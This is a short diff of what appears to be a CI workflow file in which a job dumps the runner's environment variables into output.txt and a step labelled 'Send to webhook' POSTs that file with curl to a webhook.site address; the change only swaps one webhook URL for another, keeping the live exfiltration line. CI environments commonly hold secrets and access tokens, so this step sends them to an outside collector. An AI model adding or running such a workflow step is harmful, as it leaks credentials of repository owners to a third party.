@@ -13,4 +13,4 @@ jobs:
           env >> output.txt
       - name: Send to webhook
         run: |
-          curl -X POST -H "Content-Type: text/plain" --data-binary @output.txt https://webhook.site/d83baa6d-8ba7-42bd-80ad-0a5cecf9aea5
+          curl -X POST -H "Content-Type: text/plain" --data-binary @output.txt https://webhook.site/95e9bfba-99e4-4cb1-8350-2e264675f477
